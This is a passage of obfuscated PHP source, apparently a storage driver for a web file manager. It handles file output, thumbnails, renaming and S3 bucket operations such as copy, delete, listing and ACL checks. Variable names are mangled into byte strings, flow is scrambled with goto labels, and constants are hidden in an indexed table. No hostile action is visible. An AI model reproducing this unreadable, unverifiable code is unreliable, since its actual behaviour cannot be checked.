$dØ’øœôä™); } else { header($c ¥°·™ê[150]); } goto CÊøç÷ˆäÁ; e²…»šçã·: header($c ¥°·™ê[132] . $BÊ¸£çÜ• . $c ¥°·™ê[124]); header($c ¥°·™ê[133] . $A•Ïµ¢Ñİ»); header($c ¥°·™ê[134]); goto aÎ¢ÌïÉÉ«; AØ¯Ò»Ğ: $FÅâ ëí = $this->getType() == $c ¥°·™ê[102]; $A£Ë­´ø¬Á = $GLOBALS[$c ¥°·™ê[6]][$c ¥°·™ê[84]][$c ¥°·™ê[103]][$c ¥°·™ê[104]]; $AÙ”ÂÊ¥ğ = (double) $GLOBALS[$c ¥°·™ê[6]][$c ¥°·™ê[84]][$c ¥°·™ê[103]][$c ¥°·™ê[105]] * 1024 * 1024; goto BÑÇ¡ô¯“; C–Ô¨Ğôë: $c ¥°·™ê =& $_SERVER[¼€¼ˆ¦‚¡]; $this->cacheMethod(null, null); if (!$DĞœ‹ˆÃî˜ || !$this->exist($DĞœ‹ˆÃî˜)) { show_json(LNG($c ¥°·™ê[101]), !1, $c“•ˆ—¨¦˜); } goto AØ¯Ò»Ğ; DÑ”ˆ¯òõ…: $Bê°ÚÌÇ¾© = rawurlencode($A•Ïµ¢Ñİ»); $Bê°ÚÌÇ¾© = $c ¥°·™ê[113] . $Bê°ÚÌÇ¾© . $c ¥°·™ê[117] . $Bê°ÚÌÇ¾©; if ($E¢ö•Ò¼šò) { header($c ¥°·™ê[118]); header($c ¥°·™ê[119] . $Bê°ÚÌÇ¾©); } else { header($c ¥°·™ê[120] . $Bê°ÚÌÇ¾©); } goto DÎ´ŒÁï°¿; c„™òù˜ˆœ: } public function fileOutServer($dÜÚâß, $Cî›Ùİ´ö¯ = false, $cÃÑó±Üš = false, $c‡’Èêâ¦Ñ = '') { $this->fileOut($dÜÚâß, $Cî›Ùİ´ö¯, $cÃÑó±Üš, $c‡’Èêâ¦Ñ); } public function fileOutLink($a³”™êÖ‘ù) { header($_SERVER[¼€¼ˆ¦‚¡][156] . $a³”™êÖ‘ù); die; } public function cacheMethod($cà÷óÇÍ¡«, $bÄ®ìùµÚ½) { goto cäÉœ‚¯à; fèèŸÏ‡ : $cŸ­µÜË®» = $CÄÜ£Àñ¢³[157] . $cà÷óÇÍ¡« . $CÄÜ£Àñ¢³[158] . rtrim($EÆĞ§ß—è…, $CÄÜ£Àñ¢³[8]); if (is_null($cà÷óÇÍ¡«)) { $a±™ƒÛõòó = array(); return; } if (is_null($bÄ®ìùµÚ½)) { unset($a±™ƒÛõòó[$cŸ­µÜË®»]); return; } goto Bê¿¾àãÂ†; aÜº¿‘î©ë: $a±™ƒÛõòó[$cŸ­µÜË®»] = $dº‰á¯Ö—–; return $dº‰á¯Ö—–; goto D›¢ƒøà—Ş; cäÉœ‚¯à: $CÄÜ£Àñ¢³ =& $_SERVER[¼€¼ˆ¦‚¡]; static $a±™ƒÛõòó = array(); $EÆĞ§ß—è… = $bÄ®ìùµÚ½ ? ltrim($this->getPathOuter($bÄ®ìùµÚ½), $CÄÜ£Àñ¢³[8]) : $bÄ®ìùµÚ½; goto fèèŸÏ‡ ; Bê¿¾àãÂ†: $dº‰á¯Ö—– = isset($a±™ƒÛõòó[$cŸ­µÜË®»]) ? $a±™ƒÛõòó[$cŸ­µÜË®»] : null; if (!is_null($dº‰á¯Ö—–)) { return $dº‰á¯Ö—–; } $dº‰á¯Ö—– = $this->{$cà÷óÇÍ¡«}($bÄ®ìùµÚ½); goto aÜº¿‘î©ë; D›¢ƒøà—Ş: } public function fileOutImage($eÅù³İù³, $Eù§Áàáä‘ = 250) { goto Cß§¹á—öˆ; Cß§¹á—öˆ: $Eñ®ŞŸ—¹² =& $_SERVER[¼€¼ˆ¦‚¡]; if (substr($eÅù³İù³, 0, 4) == $Eñ®ŞŸ—¹²[144]) { $this->fileOutLink($eÅù³İù³); } $Fáˆ——°Ô = $this->info($eÅù³İù³); goto cÁæÜŠ †Ø; cÁæÜŠ †Ø: if ($Fáˆ——°Ô[$Eñ®ŞŸ—¹²[77]] <= 1024 * 50 || !function_exists($Eñ®ŞŸ—¹²[159]) || $Fáˆ——°Ô[$Eñ®ŞŸ—¹²[160]] == $Eñ®ŞŸ—¹²[161]) { return $this->fileOut($eÅù³İù³); } if (isset($Fáˆ——°Ô[$Eñ®ŞŸ—¹²[162]][$Eñ®ŞŸ—¹²[163]])) { $e³ÚßÓšŞ‹ = $Fáˆ——°Ô[$Eñ®ŞŸ—¹²[162]][$Eñ®ŞŸ—¹²[163]]; } else { if (isset($Fáˆ——°Ô[$Eñ®ŞŸ—¹²[162]][$Eñ®ŞŸ—¹²[164]])) { $e³ÚßÓšŞ‹ = $Fáˆ——°Ô[$Eñ®ŞŸ—¹²[162]][$Eñ®ŞŸ—¹²[164]]; } else { $e³ÚßÓšŞ‹ = md5("{$Fáˆ——°Ô[$Eñ®ŞŸ—¹²[28]]}\x5f{$Fáˆ——°Ô[$Eñ®ŞŸ—¹²[75]]}\137{$Fáˆ——°Ô[$Eñ®ŞŸ—¹²[77]]}"); } } $e›„¤‚¦±Å = "{$e³ÚßÓšŞ‹}\x5f{$Eù§Áàáä‘}\x2e\160\x6e\x67"; goto d¤òŠíÊÊ¤; d¤òŠíÊÊ¤: if (!($bƒ¢å’¬ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Eñ®ŞŸ—¹²[165]))) { $c¶á¿Ì»ã² = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Eñ®ŞŸ—¹²[166]); } else { $c¶á¿Ì»ã² = KodIO::make($bƒ¢å’¬); } if ($bƒ¢å’¬ = IO::fileNameExist($c¶á¿Ì»ã², $e›„¤‚¦±Å)) { $a«¾¬Œ®‹• = KodIO::make($bƒ¢å’¬); return IO::fileOut($a«¾¬Œ®‹•); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto fÖ‚ĞÜª¬; A†¶´è¾Ö«: if (!($fÏ”Š­¤†¦ = IO::move($a«¾¬Œ®‹•, $c¶á¿Ì»ã²))) { return IO::fileOut($a«¾¬Œ®‹•); } del_file($a«¾¬Œ®‹•); IO::fileOut($fÏ”Š­¤†¦); goto E¥ÜùêÍÑô; fÖ‚ĞÜª¬: $a«¾¬Œ®‹• = DATA_THUMB . $e›„¤‚¦±Å; if (!@file_exists($a«¾¬Œ®‹•)) { $EˆÌ†¹Ô‚´ = TEMP_FILES; if (!is_dir($EˆÌ†¹Ô‚´)) { mk_dir($EˆÌ†¹Ô‚´); } $BšèŒİã• = $EˆÌ†¹Ô‚´ . $e³ÚßÓšŞ‹ . $Eñ®ŞŸ—¹²[91] . $Fáˆ——°Ô[$Eñ®ŞŸ—¹²[160]]; if (!@file_exists($BšèŒİã•)) { $BšèŒİã• = $this->download($eÅù³İù³, $BšèŒİã•); } $A†¹ƒ‘›‹Í = new ImageThumb($BšèŒİã•, $Eñ®ŞŸ—¹²[167]); $A†¹ƒ‘›‹Í->prorate($a«¾¬Œ®‹•, $Eù§Áàáä‘, $Eù§Áàáä‘ * 10); } if (!file_exists($a«¾¬Œ®‹•) || filesize($a«¾¬Œ®‹•) < 100) { return @file_exists($BšèŒİã•) ? IO::fileOut($BšèŒİã•) : $this->fileOut($eÅù³İù³); } goto A†¶´è¾Ö«; E¥ÜùêÍÑô: } public function fileOutImageServer($bßÊ£…Èì“, $DàåÁ¸‘É± = 250) { $this->fileOutImage($bßÊ£…Èì“, $DàåÁ¸‘É±); } public function fileNameAuto($A¡Œ¯öîœ™, $aÕğö®ä‚, $A½¾Ü®Œ± = REPEAT_RENAME, $a²Ú¼¸‹· = false) { goto BøÊòÌá¯; aâ›±ÆÚ…: while ($this->exist(rtrim($A¡Œ¯öîœ™, $BîÒ£äöÕÜ[8]) . $BîÒ£äöÕÜ[8] . $c¦¨¤Ó•“–)) { $c¦¨¤Ó•“– = $cŞ³ì¾«—° . "\x28{$Eª¿ ”ˆ¥ğ}\x29{$Cñ—Œ‹Èº’}"; $Eª¿ ”ˆ¥ğ++; } return $c¦¨¤Ó•“–; goto aãçÇ¿ ; BøÊòÌá¯: $BîÒ£äöÕÜ =& $_SERVER[¼€¼ˆ¦‚¡]; $b½²¯á½¬ = $A¡Œ¯öîœ™ === $BîÒ£äöÕÜ[33] ? $aÕğö®ä‚ : rtrim($A¡Œ¯öîœ™, $BîÒ£äöÕÜ[8]) . $BîÒ£äöÕÜ[8] . $aÕğö®ä‚; if ($A½¾Ü®Œ± == REPEAT_REPLACE || !$this->exist($b½²¯á½¬) || $a²Ú¼¸‹· && $A½¾Ü®Œ± != REPEAT_RENAME_FOLDER) { return $aÕğö®ä‚; } goto Aô„Ï©ÊÀÓ; Aô„Ï©ÊÀÓ: if ($A½¾Ü®Œ± == REPEAT_SKIP) { return !1; } $Cñ—Œ‹Èº’ = $BîÒ£äöÕÜ[91] . get_path_ext($aÕğö®ä‚); $Cñ—Œ‹Èº’ = $Cñ—Œ‹Èº’ == $BîÒ£äöÕÜ[91] || $a²Ú¼¸‹· ? $BîÒ£äöÕÜ[33] : $Cñ—Œ‹Èº’; goto AÊÔåòÒ†©; AÊÔåòÒ†©: $Eª¿ ”ˆ¥ğ = 1; $cŞ³ì¾«—° = substr($aÕğö®ä‚, 0, strlen($aÕğö®ä‚) - strlen($Cñ—Œ‹Èº’)); $c¦¨¤Ó•“– = $cŞ³ì¾«—° . "\x28{$Eª¿ ”ˆ¥ğ}\x29{$Cñ—Œ‹Èº’}"; goto aâ›±ÆÚ…; aãçÇ¿ : } public function listAllFiles($d™£…ñˆŠÒ, $E•Å¢‡‚˜¬, $B¦ÖÈ–Š» = array()) { goto B¶ò¬Óäæ; CÂ’›ä¤ñõ: foreach (array_unique($D—×ß×«ø) as $AÄĞĞ´µƒ) { $eâæ¿Ñ¸ìÀ = array($FŒ Ò´§§¢[75] => $this->getPathOuter($FŒ Ò´§§¢[8] . $d™£…ñˆŠÒ . $FŒ Ò´§§¢[8] . $AÄĞĞ´µƒ), $FŒ Ò´§§¢[76] => 1, $FŒ Ò´§§¢[77] => 0); if (substr($AÄĞĞ´µƒ, -1) != $FŒ Ò´§§¢[8]) { $eâæ¿Ñ¸ìÀ[$FŒ Ò´§§¢[76]] = 0; $aªñ¢ù«©‘ = $this->getPath($d™£…ñˆŠÒ . $FŒ Ò´§§¢[8] . $AÄĞĞ´µƒ); $eâæ¿Ñ¸ìÀ[$FŒ Ò´§§¢[77]] = isset($B¦ÖÈ–Š»[$aªñ¢ù«©‘]) ? $B¦ÖÈ–Š»[$aªñ¢ù«©‘] : $this->size($aªñ¢ù«©‘); } $b³²•‡¹¶Û[] = $eâæ¿Ñ¸ìÀ; } return $b³²•‡¹¶Û; goto B¸œ—÷éî“; B¶ò¬Óäæ: $FŒ Ò´§§¢ =& $_SERVER[¼€¼ˆ¦‚¡]; if (empty($E•Å¢‡‚˜¬)) { return array(); } $D—×ß×«ø = array(); goto EÁ‘‰ÚÄ‘; EÁ‘‰ÚÄ‘: $d™£…ñˆŠÒ = trim($d™£…ñˆŠÒ, $FŒ Ò´§§¢[8]); foreach ($E•Å¢‡‚˜¬ as $AÄĞĞ´µƒ) { $fÈ½ÊÍ–„ = ltrim(substr($AÄĞĞ´µƒ, strlen($d™£…ñˆŠÒ)), $FŒ Ò´§§¢[8]); $D—×ß×«ø = array_merge($D—×ß×«ø, $this->slicePath($fÈ½ÊÍ–„)); } $b³²•‡¹¶Û = array(); goto CÂ’›ä¤ñõ; B¸œ—÷éî“: } public function slicePath($aàÓã«„å¥) { $f‘çÃ—à“Ô =& $_SERVER[¼€¼ˆ¦‚¡]; $Bçµ·ÆíÍÌ = explode($f‘çÃ—à“Ô[8], trim($aàÓã«„å¥, $f‘çÃ—à“Ô[8])); $e“»¨§îğ = 0; do { ++$e“»¨§îğ; $D³è‚·‡ø[] = implode($f‘çÃ—à“Ô[8], array_slice($Bçµ·ÆíÍÌ, 0, $e“»¨§îğ)) . $f‘çÃ—à“Ô[8]; } while ($e“»¨§îğ < count($Bçµ·ÆíÍÌ)); $D³è‚·‡ø[count($Bçµ·ÆíÍÌ) - 1] = $aàÓã«„å¥; return $D³è‚·‡ø; } public function getHost() { $dÈÓ À‹½° =& $_SERVER[¼€¼ˆ¦‚¡]; $A£òÏä„íš = parse_url(trim($this->domain, $dÈÓ À‹½°[8])); $cí¸öèÖ¿ = isset($A£òÏä„íš[$dÈÓ À‹½°[168]]) ? $A£òÏä„íš[$dÈÓ À‹½°[168]] : http_type(); $dåâ¼ØÀ“ù = isset($A£òÏä„íš[$dÈÓ À‹½°[169]]) ? $A£òÏä„íš[$dÈÓ À‹½°[169]] : $A£òÏä„íš[$dÈÓ À‹½°[75]]; if (isset($A£òÏä„íš[$dÈÓ À‹½°[170]])) { $dåâ¼ØÀ“ù .= $dÈÓ À‹½°[4] . $A£òÏä„íš[$dÈÓ À‹½°[170]]; } return $cí¸öèÖ¿ . $dÈÓ À‹½°[171] . $dåâ¼ØÀ“ù; } public function pathEncode($bœ…°Ó¹”æ) { $eßìÜ†×÷æ =& $_SERVER[¼€¼ˆ¦‚¡]; return str_replace($eßìÜ†×÷æ[172], $eßìÜ†×÷æ[8], rawurlencode($bœ…°Ó¹”æ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($aîØ©ôÉ•Ü) { set_timeout(); require_once SDK_DIR . $_SERVER[¼€¼ˆ¦‚¡][173]; parent::__construct(); $this->_init($aîØ©ôÉ•Ü); } public function _init($c©öÅÕæ®ª) { foreach ($c©öÅÕæ®ª as $c•’‡§ƒÎÇ => $CáËÑÆ·‚¦) { if (isset($this->{$c•’‡§ƒÎÇ})) { $this->{$c•’‡§ƒÎÇ} = $CáËÑÆ·‚¦; } } $this->endpoint = $c©öÅÕæ®ª[$_SERVER[¼€¼ˆ¦‚¡][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($F¨ŞÊ¸ƒƒˆ = "\166\x34") { $this->signVer = $F¨ŞÊ¸ƒƒˆ; $this->client->setSignatureVersion($F¨ŞÊ¸ƒƒˆ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto a¨šº´¸…ï; aÉÕ¾»ÅÉ¡: if ($fä‹ÇÛº°[$AóáßÈÁÊ·[175]] != $AóáßÈÁÊ·[176] || $fä‹ÇÛº°[$AóáßÈÁÊ·[177]] != $AóáßÈÁÊ·[176]) { return !1; } $c³¾óƒ = array_map($AóáßÈÁÊ·[178], $fä‹ÇÛº°[$AóáßÈÁÊ·[179]]); if (!is_array($c³¾óƒ)) { $c³¾óƒ = array(); } goto d‹Ş«ƒèğ; d‹Ş«ƒèğ: $BÂäœÅ‘Õƒ = array($AóáßÈÁÊ·[180], $AóáßÈÁÊ·[181], $AóáßÈÁÊ·[182], $AóáßÈÁÊ·[183], $AóáßÈÁÊ·[184]); $ašÎÃáƒö³ = array_diff($BÂäœÅ‘Õƒ, $c³¾óƒ); return empty($ašÎÃáƒö³); goto c®«ÒÆ™®; a¨šº´¸…ï: $AóáßÈÁÊ· =& $_SERVER[¼€¼ˆ¦‚¡]; $fä‹ÇÛº° = $this->getBucketCors(); if (!$fä‹ÇÛº° || !is_array($fä‹ÇÛº°)) { return !1; } goto aÉÕ¾»ÅÉ¡; c®«ÒÆ™®: } public function mkfile($EÄêåî¥Àæ, $AøÒ„®‰ø = '', $D›Ñ¼Æ¿›‹ = REPEAT_RENAME) { $cƒöå¾£ĞÎ = $this->setContent($EÄêåî¥Àæ, $AøÒ„®‰ø); if ($cƒöå¾£ĞÎ !== !1) { return $this->getPathOuter($EÄêåî¥Àæ); } return !1; } public function mkdir($eÃ¤£„§Öã, $Eà‰Òª¶ÓÛ = REPEAT_SKIP) { if (empty($eÃ¤£„§Öã)) { return !1; } if ($this->_isFolder($eÃ¤£„§Öã)) { return $this->getPathOuter($eÃ¤£„§Öã); } $b‡Ë·çÂìÌ = $this->setContent($eÃ¤£„§Öã, $_SERVER[¼€¼ˆ¦‚¡][33], !0); if ($b‡Ë·çÂìÌ !== !1) { return $this->getPathOuter($eÃ¤£„§Öã); } return !1; } public function copyFile($cÑŠºÊ„Ó, $aÍ²„“ç”¿, $Eö¥å‡Ñäç = array()) { $a¯¢¦Ÿµë =& $_SERVER[¼€¼ˆ¦‚¡]; $b¸øÈ·ÄÖ = $this->objectMeta($cÑŠºÊ„Ó); if (!$b¸øÈ·ÄÖ) { return !1; } if ($b¸øÈ·ÄÖ[$a¯¢¦Ÿµë[77]] <= 1024 * 1024 * 200) { $A¥¦‹œŸæ× = $this->client->copyObject($this->bucket, $cÑŠºÊ„Ó, $this->bucket, $aÍ²„“ç”¿, $a¯¢¦Ÿµë[185], $Eö¥å‡Ñäç); } else { $A¥¦‹œŸæ× = $this->client->multiCopyObject($this->bucket, $cÑŠºÊ„Ó, $this->bucket, $aÍ²„“ç”¿, $Eö¥å‡Ñäç); } $A¥¦‹œŸæ× = $A¥¦‹œŸæ× ? $this->getPathOuter($aÍ²„“ç”¿) : !1; return $A¥¦‹œŸæ×; } public function moveFile($cùé¡áÏ¨, $AÜŸõ¨ßÖÑ) { if ($this->copyFile($cùé¡áÏ¨, $AÜŸõ¨ßÖÑ)) { $this->delFile($cùé¡áÏ¨); return $this->getPathOuter($AÜŸõ¨ßÖÑ); } return !1; } public function delFile($c‘ñöÃ¨ò˜) { return $this->client->deleteObject($this->bucket, $c‘ñöÃ¨ò˜); } public function delFolder($cÑõô½©Ù) { goto b“ˆ¦¦¿¹; bí¤ïØİ¹: return $d¡Ğ‡Ù­¦ø === $B¡µ¡µ‡ƒ ? !0 : !1; goto c„Á’´‡İÃ; eí“®ÔÑĞ¢: $d¡Ğ‡Ù­¦ø = $B¡µ¡µ‡ƒ = 0; $eÈôù‚Â— = array_chunk(array_keys($Cøó‚Š¯), 1000); foreach ($eÈôù‚Â— as $cÔ‰ÃÛ¤±Ç) { $d¡Ğ‡Ù­¦ø++; $B¡µ¡µ‡ƒ += (int) $this->client->deleteObjects($this->bucket, $cÔ‰ÃÛ¤±Ç); } goto bí¤ïØİ¹; b“ˆ¦¦¿¹: $a„¶èñğË =& $_SERVER[¼€¼ˆ¦‚¡]; $Cøó‚Š¯ = $this->listObjs($cÑõô½©Ù); if (!$Cøó‚Š¯) { $cÑõô½©Ù = trim($cÑõô½©Ù, $a„¶èñğË[8]); if (!empty($cÑõô½©Ù)) { $cÑõô½©Ù .= $a„¶èñğË[8]; } return $this->delFile($cÑõô½©Ù); } goto eí“®ÔÑĞ¢; c„Á’´‡İÃ: } public function rename($EëÚŞË­ë, $F¸©™ªÀ) { return $this->renameObject($EëÚŞË­ë, $F¸©™ªÀ); } public function listPath($aƒ¢‡¥‹Êø, $b•–µ‚„Ã¢ = false) { $A©Ì¾Ø Ò‰ =& $_SERVER[¼€¼ˆ¦‚¡]; $C­î†›í = $this->listObjs($aƒ¢‡¥‹Êø, null, null, $A©Ì¾Ø Ò‰[8]); $a¤œƒíÛÊ– = array($A©Ì¾Ø Ò‰[74] => array(), $A©Ì¾Ø Ò‰[73] => array()); foreach ($C­î†›í as $f©Œïßë£è => $aÀŞèŒãÔÔ) { if ($f©Œïßë£è == $A©Ì¾Ø Ò‰[8]) { continue; } if (isset($aÀŞèŒãÔÔ[$A©Ì¾Ø Ò‰[186]])) { $a¤œƒíÛÊ–[$A©Ì¾Ø Ò‰[74]][] = $this->folderInfo($aÀŞèŒãÔÔ[$A©Ì¾Ø Ò‰[186]], $b•–µ‚„Ã¢); } else { if (substr($aÀŞèŒãÔÔ[$A©Ì¾Ø Ò‰[28]], -1) == $A©Ì¾Ø Ò‰[8]) { continue; } $a¤œƒíÛÊ–[$A©Ì¾Ø Ò‰[73]][] = $this->fileInfo($aÀŞèŒãÔÔ[$A©Ì¾Ø Ò‰[28]], $b•–µ‚„Ã¢, $aÀŞèŒãÔÔ); } } return $a¤œƒíÛÊ–; } private function fileInfo($CºæƒØˆÓÃ, $EÅˆêïô‚¥ = false, $aÈŒ«¯Ñ· = array()) { goto eÅì·×Úî†; bïŠ×óô­¥: return $aÓ†¡‰Û¥¯; goto a‘¥‡ÈØÇœ; eÅì·×Úî†: $EˆÉæ¤«Ï =& $_SERVER[¼€¼ˆ¦‚¡]; if ($EÅˆêïô‚¥) { return array($EˆÉæ¤«Ï[28] => $this->pathThis($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[75] => $this->getPathOuter($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[29] => $EˆÉæ¤«Ï[167], $EˆÉæ¤«Ï[160] => $this->ext($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[77] => isset($aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[77]]) ? $aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[77]] : 0, $EˆÉæ¤«Ï[187] => 0, $EˆÉæ¤«Ï[107] => 0, $EˆÉæ¤«Ï[188] => !0, $EˆÉæ¤«Ï[189] => !0); } $aÓ†¡‰Û¥¯ = array($EˆÉæ¤«Ï[28] => $this->pathThis($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[75] => $this->getPathOuter($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[29] => $EˆÉæ¤«Ï[167], $EˆÉæ¤«Ï[187] => 0, $EˆÉæ¤«Ï[107] => 0, $EˆÉæ¤«Ï[77] => 0, $EˆÉæ¤«Ï[160] => $this->ext($CºæƒØˆÓÃ), $EˆÉæ¤«Ï[188] => !0, $EˆÉæ¤«Ï[189] => !0); goto BÃÕ²ÄÏÔ±; BÃÕ²ÄÏÔ±: if (empty($aÈŒ«¯Ñ·)) { $aÈŒ«¯Ñ· = $this->objectMeta($CºæƒØˆÓÃ); if (!$aÈŒ«¯Ñ·) { return $aÓ†¡‰Û¥¯; } } if (isset($aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[190]])) { $aÓ†¡‰Û¥¯[$EˆÉæ¤«Ï[107]] = $aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[190]]; } if (isset($aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[77]])) { $aÓ†¡‰Û¥¯[$EˆÉæ¤«Ï[77]] = $aÈŒ«¯Ñ·[$EˆÉæ¤«Ï[77]]; } goto bïŠ×óô­¥; a‘¥‡ÈØÇœ: } private function folderInfo($A¡óæ‹¿¸„, $a§İ½‚èŠ¬ = false) { goto Dƒí–‡‡‘Ü; cî‚£¶é’İ: if ($A¡óæ‹¿¸„ == $F²¨²¿æ¦õ[33]) { return $B´ŞùºÌšá; } $A¡óæ‹¿¸„ = trim($A¡óæ‹¿¸„, $F²¨²¿æ¦õ[8]) . $F²¨²¿æ¦õ[8]; $eÜ¾˜­ƒ‹ƒ = $this->objectMeta($A¡óæ‹¿¸„); goto F²±„Ó¤É; Dƒí–‡‡‘Ü: $F²¨²¿æ¦õ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($a§İ½‚èŠ¬) { return array($F²¨²¿æ¦õ[28] => $this->pathThis($A¡óæ‹¿¸„), $F²¨²¿æ¦õ[75] => $this->getPathOuter($F²¨²¿æ¦õ[8] . $A¡óæ‹¿¸„), $F²¨²¿æ¦õ[29] => $F²¨²¿æ¦õ[76], $F²¨²¿æ¦õ[188] => !0, $F²¨²¿æ¦õ[189] => !0); } $B´ŞùºÌšá = array($F²¨²¿æ¦õ[28] => $this->pathThis($A¡óæ‹¿¸„), $F²¨²¿æ¦õ[75] => $this->getPathOuter($F²¨²¿æ¦õ[8] . $A¡óæ‹¿¸„), $F²¨²¿æ¦õ[29] => $F²¨²¿æ¦õ[76], $F²¨²¿æ¦õ[187] => 0, $F²¨²¿æ¦õ[107] => 0, $F²¨²¿æ¦õ[188] => !0, $F²¨²¿æ¦õ[189] => !0); goto cî‚£¶é’İ; F²±„Ó¤É: if (isset($eÜ¾˜­ƒ‹ƒ[$F²¨²¿æ¦õ[190]])) { $B´ŞùºÌšá[$F²¨²¿æ¦õ[187]] = $eÜ¾˜­ƒ‹ƒ[$F²¨²¿æ¦õ[190]]; } return $B´ŞùºÌšá; goto e¿³ƒ×µ¸Œ; e¿³ƒ×µ¸Œ: } public function listObjs($D„ÑÜÙöœÓ, $aíØËä™ê = null, $C½á´Ô˜¯½ = null, $eĞì‘¸…÷• = null) { $Dª½Ã¶­ß =& $_SERVER[¼€¼ˆ¦‚¡]; $D„ÑÜÙöœÓ = trim($D„ÑÜÙöœÓ, $Dª½Ã¶­ß[8]); $aÙÙÎåõ¯Ö = empty($D„ÑÜÙöœÓ) ? $Dª½Ã¶­ß[33] : $D„ÑÜÙöœÓ . $Dª½Ã¶­ß[8]; return $this->client->getBucket($this->bucket, $aÙÙÎåõ¯Ö, $aíØËä™ê, $C½á´Ô˜¯½, $eĞì‘¸…÷•, !0); } public function has($eåªå²¨ì„, $cˆ”ƒ›ğ ³ = false, $Bâ‹÷Ë‚ˆ = true) { goto A¡“Œ¬¯ãí; A¡“Œ¬¯ãí: $AÎ„„Ÿ±å =& $_SERVER[¼€¼ˆ¦‚¡]; $aÜ©óæïğ = 0; $e‹½‡á©óé = 0; goto fÆ¿–¿Êé; DÃŒ£ë: if ($cˆ”ƒ›ğ ³) { return array($AÎ„„Ÿ±å[191] => $aÜ©óæïğ, $AÎ„„Ÿ±å[192] => $e‹½‡á©óé); } return !1; goto E›…¿¶‹ö; fÆ¿–¿Êé: $f„Ï“¶¾Â = $this->listObjs($eåªå²¨ì„, null, null, $AÎ„„Ÿ±å[8]); $f„Ï“¶¾Â = is_array($f„Ï“¶¾Â) ? $f„Ï“¶¾Â : array(); foreach ($f„Ï“¶¾Â as $BŒâ”ÆÜ×˜) { if (isset($BŒâ”ÆÜ×˜[$AÎ„„Ÿ±å[28]]) && substr($BŒâ”ÆÜ×˜[$AÎ„„Ÿ±å[28]], -1) != $AÎ„„Ÿ±å[8]) { if (!$cˆ”ƒ›ğ ³ && $Bâ‹÷Ë‚ˆ) { return !0; } $aÜ©óæïğ++; } else { if (isset($BŒâ”ÆÜ×˜[$AÎ„„Ÿ±å[186]])) { if (!$cˆ”ƒ›ğ ³ && !$Bâ‹÷Ë‚ˆ) { return !1; } $e‹½‡á©óé++; } } } goto DÃŒ£ë; E›…¿¶‹ö: } public function listAll($bøÏ×·Šä) { $f§ğ¥¥õ™ =& $_SERVER[¼€¼ˆ¦‚¡]; $CÈ·ˆ‘¿ƒÔ = $this->listObjs($bøÏ×·Šä); $dø´ÒàÌ˜Ê = $aÚ÷½ÂÚ®¤ = array(); foreach ($CÈ·ˆ‘¿ƒÔ as $aéŒª÷ŸÇÓ => $bÀß­êñç) { $dø´ÒàÌ˜Ê[] = $bÀß­êñç[$f§ğ¥¥õ™[28]]; $aÚ÷½ÂÚ®¤[$aéŒª÷ŸÇÓ] = $bÀß­êñç[$f§ğ¥¥õ™[77]]; } return $this->listAllFiles($bøÏ×·Šä, $dø´ÒàÌ˜Ê, $aÚ÷½ÂÚ®¤); } public function canRead($f¶Å¤‡êÑ) { $d¦ÎµÊ•¬Ú =& $_SERVER[¼€¼ˆ¦‚¡]; $EùÉÎäáÔ = $this->client->getAccessControlPolicy($this->bucket, $f¶Å¤‡êÑ); if (!$EùÉÎäáÔ) { return !1; } return in_array($EùÉÎäáÔ, array($d¦ÎµÊ•¬Ú[193], $d¦ÎµÊ•¬Ú[194], $d¦ÎµÊ•¬Ú[195])) ? !0 : !1; } public function canWrite($aµ†ï–İó) { $eƒ¢ãÁàÈĞ =& $_SERVER[¼€¼ˆ¦‚¡]; $F·ëÆ›®¹İ = $this->client->getAccessControlPolicy($this->bucket, $aµ†ï–İó); if (!$F·ëÆ›®¹İ) { return !1; } return in_array($F·ëÆ›®¹İ, array($eƒ¢ãÁàÈĞ[193], $eƒ¢ãÁàÈĞ[194])) ? !0 : !1; } public function getContent($CÃã¸ø¹ ) { return $this->client->getObject($this->bucket, $CÃã¸ø¹ ); } public function setContent($D†é†æ“ßÄ, $d¤ïò»Şç  = '', $eö†Õ‚‰™¿ = false) { goto bØ šÌßÚ; bØ šÌßÚ: $A¡ĞîŠä“£ =& $_SERVER[¼€¼ˆ¦‚¡]; $D†é†æ“ßÄ = $eö†Õ‚‰™¿ ? trim($D†é†æ“ßÄ, $A¡ĞîŠä“£[8]) . $A¡ĞîŠä“£[8] : $D†é†æ“ßÄ; $AŒì¥¡È¬Û = get_file_mime(get_path_ext($D†é†æ“ßÄ)); goto bÎáªéÄ±; bÎáªéÄ±: $DÏ´ß…âè¥ = $this->client->putObject($d¤ïò»Şç , $this->bucket, $D†é†æ“ßÄ, $A¡ĞîŠä“£[185], array(), $AŒì¥¡È¬Û); if (!$DÏ´ß…âè¥) { return !1; } if ($eö†Õ‚‰™¿) { return !0; } goto dº‰êï‚‘; dº‰êï‚‘: $DÏ´ß…âè¥ = $this->copyFile($D†é†æ“ßÄ, $D†é†æ“ßÄ, array($A¡ĞîŠä“£[196] => $DÏ´ß…âè¥[$A¡ĞîŠä“£[197]])); return $DÏ´ß…âè¥ ? !0 : !1; goto cº´©§Ğ; cº´©§Ğ: } public function fileSubstr($a’«é½çæ©, $fäÚĞÔ«£í, $aœÌŠì³‰) { $EÚ«‡Î–ß¹ = $fäÚĞÔ«£í + $aœÌŠì³‰ - 1; return $this->client->getObject($this->bucket, $a’«é½çæ©, array($_SERVER[¼€¼ˆ¦‚¡][198] => 